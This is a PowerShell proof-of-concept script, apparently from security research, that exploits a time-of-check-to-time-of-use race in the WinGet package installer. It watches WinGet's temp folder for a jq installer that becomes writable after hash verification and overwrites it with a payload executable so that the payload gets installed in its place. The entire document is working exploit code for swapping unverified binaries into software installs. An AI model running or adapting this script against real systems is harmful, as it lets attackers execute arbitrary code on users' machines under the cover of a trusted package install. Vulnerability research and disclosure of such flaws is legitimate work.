# TOCTOU Full Chain Test
# Target: jqlang.jq (user-scope portable, no UAC needed)
# Goal: Replace EXE after hash verification, check if replaced file is installed

param(
    [string]$WinGetTemp = "C:\Windows\Temp\WinGet",
    [string]$PayloadEXE = "C:\poc_winget\payload\payload.exe",
    [string]$ResultFile = "C:\poc_winget\TOCTOU_FINAL_RESULT.txt"
)

"[RACE] Started at $(Get-Date -Format 'HH:mm:ss.fff')" | Out-File $ResultFile
$replaced = $false
$replacedFile = ""
$sw = [System.Diagnostics.Stopwatch]::StartNew()

while ($sw.Elapsed.TotalSeconds -lt 120) {
    # Search for any new EXE/MSI in WinGet temp
    $files = Get-ChildItem $WinGetTemp -Recurse -Include "*.exe","*.msi","*.tmp" -ErrorAction SilentlyContinue |
             Where-Object { $_.LastWriteTime -gt (Get-Date).AddMinutes(-5) -and $_.Length -gt 100 }

    foreach ($f in $files) {
        if ($replaced) { break }
        $path = $f.FullName

        #Is the file available for writing? (After hash verification)
        $writable = $false
        try {
            $s = [IO.File]::Open($path, 'Open', 'ReadWrite', 'None')
            $s.Close()
            $writable = $true
        } catch {}

        if ($writable -and $f.Length -gt 1000) {
            $ts = Get-Date -Format 'HH:mm:ss.fff'
            "[RACE] $ts Found writable file: $path ($($f.Length) bytes)" | Add-Content $ResultFile

            # Save a backup
            Copy-Item $path "$path.original" -Force -ErrorAction SilentlyContinue
            
            # Replace with payload
            Copy-Item $PayloadEXE $path -Force

            $newSize = (Get-Item $path).Length
            $ts2 = Get-Date -Format 'HH:mm:ss.fff'
            "[RACE] $ts2 REPLACED! Original: $($f.Length)b → Payload: $newSize bytes" | Add-Content $ResultFile
            $replaced = $true
            $replacedFile = $path
        }
    }

    if ($replaced) { break }
    Start-Sleep -Milliseconds 30
}

if ($replaced) {
    "[RACE] Replacement successful: $replacedFile" | Add-Content $ResultFile
} else {
    "[RACE] TIMEOUT - No suitable file found in 120 seconds" | Add-Content $ResultFile
}
